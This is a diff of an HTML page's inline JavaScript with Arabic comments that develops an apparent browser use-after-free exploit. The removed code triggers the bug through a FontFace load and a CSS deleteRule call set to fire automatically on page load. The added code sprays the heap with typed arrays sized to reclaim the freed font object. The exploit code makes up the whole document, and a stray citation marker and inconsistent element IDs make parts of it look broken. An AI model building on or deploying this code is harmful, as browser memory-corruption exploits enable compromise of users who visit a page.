@@ -11,31 +11,36 @@
 </head>
 <body>
     <script>
-        async function triggerUAF() {
-            // الوصول إلى مستند الخطوط
-            const fontFaceSet = document.fonts;
-            
-            // إنشاء كائن FontFace
-            const font = new FontFace("ExploitFont", "url(trigger.woff2)");
-            fontFaceSet.add(font);
+// كود تجريبي لغرض البحث الأمني - Heap Grooming
+async function heapGrooming() {
+    const sprayCount = 1000;
+    let heapObjects = new Array(sprayCount);
 
-            // بدء التحميل غير المتزامن
-            const loadPromise = font.load();
+    // 1. ملء الذاكرة بـ ArrayBuffers لإنشاء ترتيب في الذاكرة
+    for (let i = 0; i < sprayCount; i++) {
+        heapObjects[i] = new Uint32Array(0x1000 / 4); 
+        // تخصيص مساحة مطابقة تقريباً لحجم كائن الـ FontFace
+    }
 
-            // استغلال الثغرة عبر إعادة التفاعل (Re-entrancy)
-            // حذف القاعدة أثناء انتظار اكتمال الـ Promise
-            try {
-                const styleSheet = document.getElementById('target-style').sheet;
-                styleSheet.deleteRule(0); [span_6](start_span)// هذا الإجراء يحفز تحرير كائن CSSFontFace[span_6](end_span)
-                
-                await loadPromise;
-            } catch (e) {
-                console.error("تم تنفيذ إجراء الاستغلال، تحقق من حالة الذاكرة: ", e);
-            }
-        }
+    console.log("تم رش الذاكرة (Heap Spraying) بنجاح.");
+    return heapObjects;
+}
 
-        // تشغيل الثغرة تلقائياً عند تحميل الصفحة
-        window.onload = triggerUAF;
+// دالة لدمج عملية الـ UAF مع الـ Grooming
+async function executeExploitStep() {
+    // 1. تحضير الذاكرة
+    const spray = await heapGrooming();
+
+    // 2. تفعيل الثغرة (كما في المثال السابق)
+    // عند تنفيذ deleteRule، سيصبح موقع كائن CSSFontFace متاحاً
+    // ومن المرجح أن يتم استبداله بأحد كائنات الـ ArrayBuffers التي أنشأناها
+    document.getElementById('s').sheet.deleteRule(0);
+
+    // 3. التحقق (Verification)
+    // محاولة الوصول للكائن المحرر عبر الكائن الجديد (ArrayBuffer)
+    console.log("محاولة التحكم في الكائن المحرر...");
+}
+
     </script>
 </body>
 </html>
